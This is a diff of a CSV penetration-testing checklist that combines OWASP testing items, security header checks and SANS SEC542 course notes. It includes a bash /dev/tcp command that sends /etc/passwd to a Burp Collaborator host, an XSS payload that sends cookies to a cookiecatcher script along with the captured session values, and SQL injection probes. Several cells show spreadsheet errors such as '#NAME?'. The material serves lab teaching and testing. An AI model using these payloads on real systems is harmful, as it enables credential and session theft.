+Source: http://pastebin.com/u6FY1xDA",Extras,,,,,,,/txt/xss100.txt,80,FALSE,TRUE,,FALSE
 EXT-20160920T182257,Extras,Check X-Frame-Options header (clickjacking protection),,,X-Frame-Options header not used to protect against clickjacking,,1,"Verify that a suitable X-FRAME-OPTIONS header is in use for sites where content should not be viewed in a 3rd-party X-Frame.
 
 Examples:
@@ -307,7 +576,7 @@ X-Frame-Options: DENY
 X-Frame-Options: SAMEORIGIN
 X-Frame-Options: ALLOW-FROM https://example.com/",Extras,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Frame-Options,https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,,FALSE
 EXT-20160920T182420,Extras,Check X-Content-Type-Options header,,,Missing X-Content-Type-Options header to mitigate against MIME-sniffing,,2,"Verify that all API responses contain X-Content-Type-Options: nosniff and Content-Disposition: attachment; filename=""api.json"" (or other appropriate filename for the content type).",Extras,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#X-Content-Type-Options,https://www.veracode.com/blog/2014/03/guidelines-for-setting-security-headers,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,827,,,,TRUE
-EXT-20160920T182615,Extras,Check Content-Security-Policy header,,,No Content-Security-Policy header,,0,"Verify that a content security policy (CSPv2) is in place that helps mitigate common DOM, XSS, JSON, and JavaScript injection vulnerabilities. ",Extras,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Content-Security-Policy,,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,,TRUE
+EXT-20160920T182615,Extras,Check Content-Security-Policy header,,,No Content-Security-Policy header,,0,"Verify that a content security policy (CSPv2) is in place that helps mitigate common DOM, XSS, JSON, and JavaScript injection vulnerabilities.",Extras,,,,,https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#Content-Security-Policy,,https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project,,,,,TRUE
 EXT-20160920T182709,Extras,Check X-XSS-Protection header,,,Missing X-XSS-Protection header to mitigate against XSS,,2,"Verify that the X-XSS-Protection: 1; mode=block header is in place to enable browser reflected XSS filters.
 
 Valid Settings
@@ -373,9 +642,7 @@ See also:
 - https://www.arneswinnen.net/category/research/publications/
 - https://www.torontowebsitedeveloper.com/
 - http://feeds.soundcloud.com/users/soundcloud:users:217591392/sounds.rss
-- https://www.youtube.com/watch?v=KDo68Laayh8 (Frans Rosen)
-
-",Extras,,,,,,,https://leanpub.com/web-hacking-101,933,,,,
+- https://www.youtube.com/watch?v=KDo68Laayh8 (Frans Rosen)",Extras,,,,,,,https://leanpub.com/web-hacking-101,933,,,,
 EXT-20161101T203017,Extras,Analysis of authentication flow,,,Information Exposure Through Query Strings in GET Request (CWE-598),,2,Analyze the authentication mechanism. Capture details here. ,Extras,,,"The web application uses the GET method to process requests that contain sensitive information, which can expose that information through the browser's history, Referers, web logs, and other sources.",,,,,598,,,,
 EXT-20161103T132859,Extras,Test data to use,,,Test data to use,,0,Capture good test data to use.,Extras,,,,,,,,,,,,
 EXT-20161108T150517,Extras,AngularJS Template Injection,,,AngularJS Template Injection,,3,"Try injecting payload that Angular would interpret.
@@ -387,8 +654,7 @@ Example:
 Refs:
 - https://hackerone.com/reports/125027
 - http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
-- https://docs.angularjs.org/guide/expression
-",Extras,,,,,,,http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html,,,,,
+- https://docs.angularjs.org/guide/expression",Extras,,,,,,,http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html,,,,,
 EXT-20161108T220809,Extras,Search for subdomains,,,,,,"Use a subdomain research tool to find subdomains:
 - Search engines (Google, Bing, Yahoo, Baidu)
 - https://virustotal.com/ - Search for “domain:target.com” and virustotal will provide extensive information in addition to Observed subdomains.
@@ -410,8 +676,7 @@ Bruteforcing:
     Fierce - A semi-lightweight enumeration scanner
     Gobuster - Alternative directory and file busting tool written in Go
     DNSenum - Offers recursive and threaded subdomain enumeration.
-    AltDNS - offers bruteforcing based on permutations of already found domains
-",Extras,,,,,,,https://dnsdumpster.com,,,,,
+    AltDNS - offers bruteforcing based on permutations of already found domains",Extras,,,,,,,https://dnsdumpster.com,,,,,
 EXT-20161214T170114,Extras,Server-Side Request Forgery (SSRF),,,Server-Side Request Forgery (SSRF),,3,"Try this:
 - https://www.owasp.org/index.php/OWASP_Skanda_SSRF_Exploitation_Framework
 - https://github.com/jacobreynolds/ssrfdetector
@@ -429,8 +694,7 @@ Cloud server meta-data - Cloud services such as AWS provide a REST interface on 
 Database HTTP interfaces - NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data
 Internal REST interfaces
 Files - The attacker may be able to read files using file:// URIs
-The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.
-",Extras,,,"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.
+The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.",Extras,,,"The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.
 
 By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.
 
@@ -570,8 +834,7 @@ EXT-20190314T030421,Extras,Try Burp Collaborator,,,,,,"Try these:
 $ echo -e ""GET / HTTP/1.1\r\nhost: http://qga92es194u6457ezgb1v9zn7ed51u.burpcollaborator.net\r\nConnection: close\r\n\r\n$(cat /etc/passwd)"" > /dev/tcp/qga92es194u6457ezgb1v9zn7ed51u.burpcollaborator.net/80
 
 Details on /dev/tcp:
-- http://tldp.org/LDP/abs/html/devref1.html
-",Extras,,,,,,,https://portswigger.net/burp/documentation/collaborator,,,,,
+- http://tldp.org/LDP/abs/html/devref1.html",Extras,,,,,,,https://portswigger.net/burp/documentation/collaborator,,,,,
 EXT-20190314T044458,Extras,Check CSP Headers,,,Insecure Content Security Policy setting,,2,,Extras,,,The software does not properly verify that the source of data or communication is valid.,,,,,346,,,,TRUE
 EXT-20190314T154101,Extras,WAPT Runner testing,,,No corresponding CWE,,,Just a dummy test to try stuff in WAPT Runner.,Extras,,,,,,,,0,,,,
 EXT-20190316T152442,Extras,Check for HttpOnly flag on important cookies,,,Sensitive Cookie Without 'HttpOnly' Flag,,2,,Extras,,,,"PHASE:Implementation
@@ -761,8 +1024,7 @@ DESCRIPTION:For platforms such as ASP that do not generate new values for sessio
 OTG4-4.07.04,OWASP-TG4,Testing for Exposed Session Variables (OTG-SESS-004),,,,,,,4.7 Session Mgmt Testing,,4.07.04,,,,,https://www.owasp.org/index.php/Testing_for_Exposed_Session_Variables_(OTG-SESS-004),,TRUE,TRUE,,
 OTG4-4.07.05,OWASP-TG4,Testing for CSRF (OTG-SESS-005),,,Cross-Site Request Forgery (CSRF),,2,,4.7 Session Mgmt Testing,,4.07.05,"The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.
 It is possible to trick a user into executing potentially dangerous actions against the target site due to a lack of Cross- Site-Request-Forgery (CSRF) protections. CSRF attacks are a class of confused deputy attacks that exploit the behavior of browsers always sending authorization cookies in requests. The target site has no secure way of verifying the request was initiated from a link on a trusted domain.
-Effort to Fix: 4 - Simple design error. Requires redesign and up to 5 days to fix.
-","Protect all forms by generating a random unique nonce value each time the page is requested. This nonce value should be included into the form as a parameter, usually as a hidden input field. These nonce values should be linked to the user's session ID and validated on submission by comparing the generated nonce value for the form with the one that was submitted by the user. When possible, use built in CSRF protections offered by various vetted libraries or frameworks instead of developing a custom implementation.
+Effort to Fix: 4 - Simple design error. Requires redesign and up to 5 days to fix.","Protect all forms by generating a random unique nonce value each time the page is requested. This nonce value should be included into the form as a parameter, usually as a hidden input field. These nonce values should be linked to the user's session ID and validated on submission by comparing the generated nonce value for the form with the one that was submitted by the user. When possible, use built in CSRF protections offered by various vetted libraries or frameworks instead of developing a custom implementation.
 
 PHASE:Architecture and Design
 STRATEGY:Libraries or Frameworks
@@ -1171,8 +1433,7 @@ S542-1.3.06,SEC542,Digest Auth.,,,,,,"- To �fix� Basic Auth.
 - RFC2069 replaced by 2617. 
 - In RFC2617: Quality of protection (qop) flag (different methods for hashing).  Client Nonce (cnonce).
 - A nonce is the same as a salt.
-- A cnonce can be sent to server to authenticate it (not used often, if at all)
-",1. Attacker's view,1.3 Client Auth.,B1P51,,,,,sec542/1.3/index.htm#s6,,,,,
+- A cnonce can be sent to server to authenticate it (not used often, if at all)",1. Attacker's view,1.3 Client Auth.,B1P51,,,,,sec542/1.3/index.htm#s6,,,,,
 S542-1.3.07,SEC542,Digest Auth. Illustrated,,,,,,"1. Initial client request. 
 2. Server sends 401 with nonce. 
 3. Client sends request with Nonce received. Response contains MD5 hash generated by the algo specified in qop (eg: auth)",1. Attacker's view,1.3 Client Auth.,B1P52,,,,,sec542/1.3/index.htm#s7,,,,,
@@ -1349,7 +1610,7 @@ S542-1.5.15,SEC542,3. Methodology,,,,,,"- Describe the methodology during the te
 - 3 to 10 pages",1. Attacker's view,1.5 Methodology,B1P116,,,,,sec542/1.5/index.htm#s15,,,,,
 S542-1.5.16,SEC542,4. Findings,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P117,,,,,sec542/1.5/index.htm#s16,,,,,
 S542-1.5.17,SEC542,5. Conclusion,,,,,,#NAME?,1. Attacker's view,1.5 Methodology,B1P118,,,,,sec542/1.5/index.htm#s17,,,,,
-S542-1.5.18,SEC542,Reporting Tools,,,,,," '- 2 types: 
+S542-1.5.18,SEC542,Reporting Tools,,,,,,"'- 2 types: 
 - Data  Collection: Wiki (MediaWiki, MoinMoin), CAL9000 from OWASP, Mind Mapping (FreeMind/MindMapper)
 - Report Generation: Word Processor, OWASP Report Generator",1. Attacker's view,1.5 Methodology,B1P119,,,,,sec542/1.5/index.htm#s18,,,,,
 S542-1.5.19,SEC542,Data Collection Tools,,,,,,"- CAL9000 from OWASP (in HTML & Javascript, runs locally)
@@ -1394,7 +1655,7 @@ S542-1.6.13,SEC542,Javascript Events in Attacks,,,,,,#NAME?,1. Attacker's view,1
 S542-1.6.14,SEC542,,,,,,,,1. Attacker's view,1.6 JavaScript,,,,,,sec542/1.6/index.htm#s14,,,,,
 S542-1.6.15,SEC542,Document Object Model,,,,,,"- Standard interface to the document 
 - Allows script access to content, structure and style
-- document.forms[0], document.write(), form.action,  form.submit() ",1. Attacker's view,1.6 JavaScript,B1P154,,,,,sec542/1.6/index.htm#s15,,,,,
+- document.forms[0], document.write(), form.action,  form.submit()",1. Attacker's view,1.6 JavaScript,B1P154,,,,,sec542/1.6/index.htm#s15,,,,,
 S542-1.6.16,SEC542,DOM Nodes,,,,,,#NAME?,1. Attacker's view,1.6 JavaScript,B1P155,,,,,sec542/1.6/index.htm#s16,,,,,
 S542-1.6.17,SEC542,JavaScript Object Methods and Properties,,,,,,"- Object-oriented: var myString = new String();
 - Objects can be created
@@ -1499,7 +1760,7 @@ S542-2.1.35,SEC542,Fierce Domain Scanner,,,,,,"- Perl script from Robert Hansen 
 - Reverse lookup on next and previous 5 IP addresses
 - Uses set of prefixes to find hosts (www2...)
 - Lookup hosts in domain: fierce.pl -dns sec542.org 
-- Scan IP range: fierce.pl -range 192.168.1.0-255 -dnsservers ns1.sec542.org ",2. Recon & Mapping,2.1 Recon,B2P36,,,,,sec542/2.1/index.htm#s35,,,,,
+- Scan IP range: fierce.pl -range 192.168.1.0-255 -dnsservers ns1.sec542.org",2. Recon & Mapping,2.1 Recon,B2P36,,,,,sec542/2.1/index.htm#s35,,,,,
 S542-2.1.36,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,sec542/2.1/index.htm#s36,,,,,
 S542-2.1.37,SEC542,DNS Exercise (Harvesting),,,,,,-,2. Recon & Mapping,2.1 Recon,B2P38,,,,,sec542/2.1/index.htm#s37,,,,,
 S542-2.1.38,SEC542,DNS Exercise: Nslookup,,,,,,,2. Recon & Mapping,2.1 Recon,B2P39,,,,,sec542/2.1/index.htm#s38,,,,,
@@ -1522,9 +1783,7 @@ S542-2.1.39,SEC542,DNS Exercise: Dig,,,,,,"- ?dig @ns1.sec542.org sec542.org
 
 ;; ANSWER SECTION:
 sec542.org.  38400 IN MX 10 mail.sec542.org.
-sec542.org.  38400 IN MX 20 mail2.sec542.org.
-
-",2. Recon & Mapping,2.1 Recon,B2P41,,,,,sec542/2.1/index.htm#s39,,,,,
+sec542.org.  38400 IN MX 20 mail2.sec542.org.",2. Recon & Mapping,2.1 Recon,B2P41,,,,,sec542/2.1/index.htm#s39,,,,,
 S542-2.1.40,SEC542,DNS Exercise: Host,,,,,,"- Q7: What result is interesting? List of hosts, name servers, aliases (cname)
 ?$ host -la sec542.org ns1.sec542.org
 sec542.org.          SOA ns1.sec542.org. admin.sec542.org. (
@@ -1557,7 +1816,7 @@ sec542.org.          SOA ns1.sec542.org. admin.sec542.org. (
    604800 ;expire time (1 week)
    38400 ;default ttl (10 hours, 40 minutes)
    )",2. Recon & Mapping,2.1 Recon,B2P42,,,,,sec542/2.1/index.htm#s40,,,,,
-S542-2.1.41,SEC542,DNS Exercise: Fierce,,,,,," '- Run commands:
+S542-2.1.41,SEC542,DNS Exercise: Fierce,,,,,,"'- Run commands:
      cd /usr/bin/samurai/fierce2
      fierce -dns sec542.org
      fierce -range 192.168.1.0-255 -dnsservers ns1.sec542.org
@@ -1627,8 +1886,7 @@ Starting Fierce Scan at Thu Mar  3 10:16:46 2011
 Args:  -dnsservers 192.168.1.41 -range 192.168.1.0-255
 Finding Nearby IPs ... 
     192.168.1.23   mail.sec542.org     23.1.168.192.in-addr.arpa
-    192.168.1.41   www.sec542.org     41.1.168.192.in-addr.arpa
-",2. Recon & Mapping,2.1 Recon,B2P43,,,,,sec542/2.1/index.htm#s41,,,,,
+    192.168.1.41   www.sec542.org     41.1.168.192.in-addr.arpa",2. Recon & Mapping,2.1 Recon,B2P43,,,,,sec542/2.1/index.htm#s41,,,,,
 S542-2.1.42,SEC542,DNS Exercise: Answers,,,,,,-,2. Recon & Mapping,2.1 Recon,B2P44,,,,,sec542/2.1/index.htm#s42,,,,,
 S542-2.1.43,SEC542,,,,,,,,2. Recon & Mapping,2.1 Recon,,,,,,sec542/2.1/index.htm#s43,,,,,
 S542-2.1.44,SEC542,Open Source Information,,,,,,#NAME?,2. Recon & Mapping,2.1 Recon,B2P46,,,,,sec542/2.1/index.htm#s44,,,,,
@@ -1719,8 +1977,7 @@ Instead use the HTTPS scheme to access this URL, please.<br />
 <blockquote>Hint: <a href=""https://www.sec542.org/""><b>https://www.sec542.org/</b></a></blockquote></p>
 <hr>
 <address>Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g Server at www.sec542.org Port 443</address>
-</body></html>
-",2. Recon & Mapping,2.2 Mapping,B2P84,,,,,sec542/2.2/index.htm#s17,,,,,
+</body></html>",2. Recon & Mapping,2.2 Mapping,B2P84,,,,,sec542/2.2/index.htm#s17,,,,,
 S542-2.2.18,SEC542,Web Server Fingerprinting Exercise: Nmap,,,,,,"Q3: What services did nmap identify? 
        OpenSSH(22),  ISC Bind (53), http(80), https(443), webmin(10000)
 - Q4: How many different web servers apps? Apache/PH and webmin
@@ -1737,14 +1994,13 @@ PORT      STATE SERVICE
 |  robots: has 2 disallowed entries 
 |_ /cgi-bin/ /admin
 443/tcp   open  https
-10000/tcp open  snet-sensor-mgmt
-",2. Recon & Mapping,2.2 Mapping,B2P85,,,,,sec542/2.2/index.htm#s18,,,,,
+10000/tcp open  snet-sensor-mgmt",2. Recon & Mapping,2.2 Mapping,B2P85,,,,,sec542/2.2/index.htm#s18,,,,,
 S542-2.2.19,SEC542,Web Server Fingerprinting Exercise: HTTPrint,,,,,,#REF!,2. Recon & Mapping,2.2 Mapping,B2P86,,,,,sec542/2.2/index.htm#s19,,,,,
 S542-2.2.20,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,sec542/2.2/index.htm#s20,,,,,
 S542-2.2.21,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,sec542/2.2/index.htm#s21,,,,,
 S542-2.2.22,SEC542,Analyzing SSL Support,,,,,,"- Which SSL versions? SSLv2, v3 or TLSv1
 - Which ciphers? 128 bit? NULL cipher?
-- Self-signed certs ",2. Recon & Mapping,2.2 Mapping,B2P89,,,,,sec542/2.2/index.htm#s22,,,,,
+- Self-signed certs",2. Recon & Mapping,2.2 Mapping,B2P89,,,,,sec542/2.2/index.htm#s22,,,,,
 S542-2.2.23,SEC542,Scripting OpenSSL,,,,,,"- openssl s_client -connect www.sans.org -ssl2
 - openssl s_client -connect www.sans.org:443 -cipher NULL
 - Very scriptable",2. Recon & Mapping,2.2 Mapping,B2P90,,,,,sec542/2.2/index.htm#s23,,,,,
@@ -1812,8 +2068,7 @@ EXP-EDH-RSA-DES-CBC-SHA - 40 bits
 EXP-DES-CBC-SHA - 40 bits
 EXP-RC2-CBC-MD5 - 40 bits
 EXP-RC4-MD5 - 40 bits
-samurai@samurai-sec542:/usr/bin/samurai/sslthing$ 
-",2. Recon & Mapping,2.2 Mapping,B2P97,,,,,sec542/2.2/index.htm#s30,,,,,
+samurai@samurai-sec542:/usr/bin/samurai/sslthing$",2. Recon & Mapping,2.2 Mapping,B2P97,,,,,sec542/2.2/index.htm#s30,,,,,
 S542-2.2.31,SEC542,SSL Strength Exercise: Examine the Results,,,,,,- Q1: Report 1st glance impression? Disable SSLv2,2. Recon & Mapping,2.2 Mapping,B2P98,,,,,sec542/2.2/index.htm#s31,,,,,
 S542-2.2.32,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,sec542/2.2/index.htm#s32,,,,,
 S542-2.2.33,SEC542,,,,,,,,2. Recon & Mapping,2.2 Mapping,,,,,,sec542/2.2/index.htm#s33,,,,,
@@ -1875,8 +2130,7 @@ S542-2.2.52,SEC542,Nikto Exercise: Scan Port 80,,,,,,"?/usr/bin/samurai/nikto$ .
 + 3577 items checked: 17 item(s) reported on remote host
 + End Time:        2011-03-04 18:44:08 (17 seconds)
 ---------------------------------------------------------------------------
-+ 1 host(s) tested
-",2. Recon & Mapping,2.2 Mapping,B2P120,,,,,sec542/2.2/index.htm#s52,,,,,
++ 1 host(s) tested",2. Recon & Mapping,2.2 Mapping,B2P120,,,,,sec542/2.2/index.htm#s52,,,,,
 S542-2.2.53,SEC542,Nikto Exercise: Analyzing Initial Scan,,,,,,"- Q1: What's intesting  in nikto's output? Supported methods, mod_ssl vuln, scripts, defaults
 - Q2: What info can be discovered about the system? PHP/mod_ssl versions, new vulns
 - Q3: Based on Nikto, what action items are for the client?
@@ -1908,8 +2162,7 @@ S542-2.3.12,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,sec542/2.3/index
 S542-2.3.13,SEC542,Spidering Exercise: Wget,,,,,,"- wget -r http://www.sec542.org
 - Q1: Why are there discrepancies between the orig site and the wget download?
    A1: wget doesn't handle dynamically generated links (javascript), no creds were provided, no bruteforcing...
-- Q2 - Q4 (answers at pg 143)
-",2. Recon & Mapping,2.3 Spidering,B2P136,,,,,sec542/2.3/index.htm#s13,,,,,
+- Q2 - Q4 (answers at pg 143)",2. Recon & Mapping,2.3 Spidering,B2P136,,,,,sec542/2.3/index.htm#s13,,,,,
 S542-2.3.14,SEC542,Spidering Exercise: WebScarab,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P137,,,,,sec542/2.3/index.htm#s14,,,,,
 S542-2.3.15,SEC542,,,,,,,,2. Recon & Mapping,2.3 Spidering,,,,,,sec542/2.3/index.htm#s15,,,,,
 S542-2.3.16,SEC542,Spidering Exercise: Burp,,,,,,,2. Recon & Mapping,2.3 Spidering,B2P139,,,,,sec542/2.3/index.htm#s16,,,,,
@@ -2011,9 +2264,7 @@ S542-3.1.15,SEC542,,,,,,,,3. Server-Side Disc.,3.1 Scanners,,,,,,sec542/3.1/inde
 S542-3.1.16,SEC542,Grendel Exercise: Configure the Spider,,,,,,"- /usr/bin/samurai/grendel-scan$ ./grendel.sh
 - General Settings: 
   Base URLs: www.sec542.org, www.sec542.org/scanners
-  Output Directory: /home/samurai/scanresults/grendel
-
-",3. Server-Side Disc.,3.1 Scanners,B3P16,,,,,sec542/3.1/index.htm#s16,,,,,
+  Output Directory: /home/samurai/scanresults/grendel",3. Server-Side Disc.,3.1 Scanners,B3P16,,,,,sec542/3.1/index.htm#s16,,,,,
 S542-3.1.17,SEC542,Grendel Exercise: Select Plug-ins,,,,,,"- Test Module Selection: Select modules
    Keep defaults except: remove Website Mirror and add Comment Lister
 - Scan->Start Scan",3. Server-Side Disc.,3.1 Scanners,B3P17,,,,,sec542/3.1/index.htm#s17,,,,,
@@ -2114,7 +2365,7 @@ S542-3.2.11,SEC542,Directory Browsing Exercise: Running find_accounts,,,,,,"- /u
   Found: bolson : (http://www.sec542.org/~bolson)
   Found: djohnson : (http://www.sec542.org/~djohnson",3. Server-Side Disc.,3.2 Manual Verif.,B3P71,,,,,sec542/3.2/index.htm#s11,,,,,
 S542-3.2.12,SEC542,Directory Browsing Exercise: User Directories,,,,,,"- On sec542 VM, copy phpinfo.php to ~/public_html/, ln  -s /etc gift
-- On samurai VM, browsee to www.sec542.org/�sec542",3. Server-Side Disc.,3.2 Manual Verif.,B3P72,,,,,sec542/3.2/index.htm#s12,,,,,
+- On samurai VM, browsee to www.sec542.org/sec542",3. Server-Side Disc.,3.2 Manual Verif.,B3P72,,,,,sec542/3.2/index.htm#s12,,,,,
 S542-3.2.13,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,sec542/3.2/index.htm#s13,,,,,
 S542-3.2.14,SEC542,Username Harvesting,,,,,,"- Using error messages, find existing usernames
 - It's a problem, it's 50% of the info needed to login and it can lead to reputational problems (spamming)",3. Server-Side Disc.,3.2 Manual Verif.,B3P74,,,,,sec542/3.2/index.htm#s14,,,,,
@@ -2207,8 +2458,7 @@ S542-3.2.62,SEC542,Blind SQL Injection Discovery,,,,,,"- Look for boolean behavi
   index.php?itemid=9   (returns data for item 9)
   index.php?itemid='   (returns a no item found result)
   index.php?itemid=9' and 1=1;--   (returns data for item 9)
-  index.php?itemid=9' and 1=0;--   (returns a no item found result)
-",3. Server-Side Disc.,3.2 Manual Verif.,B3P122,,,,,sec542/3.2/index.htm#s62,,,,,
+  index.php?itemid=9' and 1=0;--   (returns a no item found result)",3. Server-Side Disc.,3.2 Manual Verif.,B3P122,,,,,sec542/3.2/index.htm#s62,,,,,
 S542-3.2.63,SEC542,20 Questions (blind SQL injection),,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P123,,,,,sec542/3.2/index.htm#s63,,,,,
 S542-3.2.64,SEC542,Blind SQL using Timing,,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P124,,,,,sec542/3.2/index.htm#s64,,,,,
 S542-3.2.65,SEC542,SQL Injection Tools,,,,,,-,3. Server-Side Disc.,3.2 Manual Verif.,B3P125,,,,,sec542/3.2/index.htm#s65,,,,,
@@ -2255,8 +2505,7 @@ S542-3.2.91,SEC542,XSS Scripting Exercise: Exploit Code,,,,,,"- In phpmyadmin UR
 ?index.php?lang=<script>var lo=document.location;document.location='//192.168.1.41/cookiecatcher.php?'%2bdocument.cookie;var la = new Array();la = lo.toString().split('?');document.location=la[0];</script>",3. Server-Side Disc.,3.2 Manual Verif.,B3P151,,,,,sec542/3.2/index.htm#s91,,,,,
 S542-3.2.92,SEC542,XSS Scripting Exercise: Exploiting phpMyAdmin,,,,,,"- See the cookie captured by cookiecatcher.php:
 ?sec542@sec542:/usr/local/awstats/wwwroot/cgi-bin$ cat /tmp/cookiedump 
-Recieved=/cookiecatcher.php?phpMyAdmin=8inQMTbNSkHoWyOfKpG7-DN46U8;%20phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bi%3A-1%3B%7D;%20phpbb2mysql_sid=c8eca014bb5ba0b3da1a09982e5f7450
-",3. Server-Side Disc.,3.2 Manual Verif.,B3P152,,,,,sec542/3.2/index.htm#s92,,,,,
+Recieved=/cookiecatcher.php?phpMyAdmin=8inQMTbNSkHoWyOfKpG7-DN46U8;%20phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bi%3A-1%3B%7D;%20phpbb2mysql_sid=c8eca014bb5ba0b3da1a09982e5f7450",3. Server-Side Disc.,3.2 Manual Verif.,B3P152,,,,,sec542/3.2/index.htm#s92,,,,,
 S542-3.2.93,SEC542,,,,,,,,3. Server-Side Disc.,3.2 Manual Verif.,,,,,,sec542/3.2/index.htm#s93,,,,,
 S542-3.2.94,SEC542,Cross Site Request Forgery (CSRF),,,,,,#NAME?,3. Server-Side Disc.,3.2 Manual Verif.,B3P154,,,,,sec542/3.2/index.htm#s94,,,,,
 S542-3.2.95,SEC542,CSRF Attack Walkthrough,,,,,,"- Determine a link that initates a transaction that users predictable parameters
@@ -2450,7 +2699,7 @@ S542-4.3.11,SEC542,Allow-Access-From,,,,,,"- Allow from all hosts in domain (*.s
 S542-4.3.12,SEC542,Allow-HTTP-Request-Headers-From,,,,,,"- Other  (previous) policies control what can be pulled
 - This one sets what can be pushed (via HTTP headers)
 - <allow-http-request-headers domain=""sec542.org"" headers=""X-SessionID, Authorization""/>
-- This allows a SWF file hosted in sec542.org to push the Authorization and/or X-SessionID header ",4. Client-Side Disc.,4.3 Flash,B4P94,,,,,sec542/4.3/index.htm#s12,,,,,
+- This allows a SWF file hosted in sec542.org to push the Authorization and/or X-SessionID header",4. Client-Side Disc.,4.3 Flash,B4P94,,,,,sec542/4.3/index.htm#s12,,,,,
 S542-4.3.13,SEC542,,,,,,,,4. Client-Side Disc.,4.3 Flash,,,,,,sec542/4.3/index.htm#s13,,,,,
 S542-4.3.14,SEC542,Flash and HTTP,,,,,,"- HTTP requests are one the major Flash features from a Pentester's focus (besides hardcoded passwords...)
 - Done via ActionScript",4. Client-Side Disc.,4.3 Flash,B4P96,,,,,sec542/4.3/index.htm#s14,,,,,
@@ -2507,35 +2756,35 @@ S542-4.4.14,SEC542,JAD Exercise: Launch,,,,,,#NAME?,4. Client-Side Disc.,4.4 Jav
 S542-4.4.15,SEC542,JAD Exercise: Launch,,,,,,"- ?./jad ~/classes/MyAddress.class
 - vi MyAddress.jad",4. Client-Side Disc.,4.4 Java Applets,B4P134,,,,,sec542/4.4/index.htm#s15,,,,,
 S542-4.4.16,SEC542,JAD Exercise: Review Source,,,,,,-,4. Client-Side Disc.,4.4 Java Applets,B4P135,,,,,sec542/4.4/index.htm#s16,,,,,
-S542-4.5.01,SEC542,PHP: Section Objectives,,,,,,"Fundamentals of PHP and it's capabilities, PHP Basics, and onfiguration options, PHP code block structure, variables, control statements, and language capabilities.",4. Client-Side Disc.,4.5 PHP,B4P136,,,,,sec542/4.5/index.htm#s1,,,,,
+S542-4.5.01,SEC542,PHP: Section Objectives,,,,,,"Fundamentals of PHP and it's capabilities, PHP Basics, and onfiguration options, PHP code block structure, variables, control statements, and language capabilities.",4. Client-Side Disc.,PHP 4.50,B4P136,,,,,sec542/4.5/index.htm#s1,,,,,
 S542-4.5.02,SEC542,Why PHP for Pen Testers,,,,,,"- Most common server-side scripting language
 - Understand server apps and discover vulns
-- Server-side weapons: build controller apps to gather data from client-side attacks, proxy client requests to bypass SOP...)",4. Client-Side Disc.,4.5 PHP,B4P137,,,,,sec542/4.5/index.htm#s2,,,,,
+- Server-side weapons: build controller apps to gather data from client-side attacks, proxy client requests to bypass SOP...)",4. Client-Side Disc.,PHP 4.50,B4P137,,,,,sec542/4.5/index.htm#s2,,,,,
 S542-4.5.03,SEC542,PHP,,,,,,"- PHP 5 is current version
-- Widely used with Apache but MS now supports PHP with IIS",4. Client-Side Disc.,4.5 PHP,B4P138,,,,,sec542/4.5/index.htm#s3,,,,,
+- Widely used with Apache but MS now supports PHP with IIS",4. Client-Side Disc.,PHP 4.50,B4P138,,,,,sec542/4.5/index.htm#s3,,,,,
 S542-4.5.04,SEC542,Server-Side PHP,,,,,,"- (as opposed to PHP in a script like Python)
 - <?php ?> or <? ... ?> with server cfg'd with short tags
-- Typically the output will be HTML (could also be AJAX/XML/JavaScript)",4. Client-Side Disc.,4.5 PHP,B4P139,,,,,sec542/4.5/index.htm#s4,,,,,
+- Typically the output will be HTML (could also be AJAX/XML/JavaScript)",4. Client-Side Disc.,PHP 4.50,B4P139,,,,,sec542/4.5/index.htm#s4,,,,,
 S542-4.5.05,SEC542,PHP Config Options,,,,,,"- register_globals=[ON|OFF]  (cookies, get, post as globals) or use local var such as $_POST[pageid] 
    Used to be the default (=ON), not a good idea: easy to override global vars, cookies, session states, user id
 - display_errors=[ON|OFF]  (send errors to browser
   PHP errors often contain sensitive information  (installed path, function names, script path, config settings...)
 - allow_url_fopen=[ON|OFF]  (allow file open from remote servers)
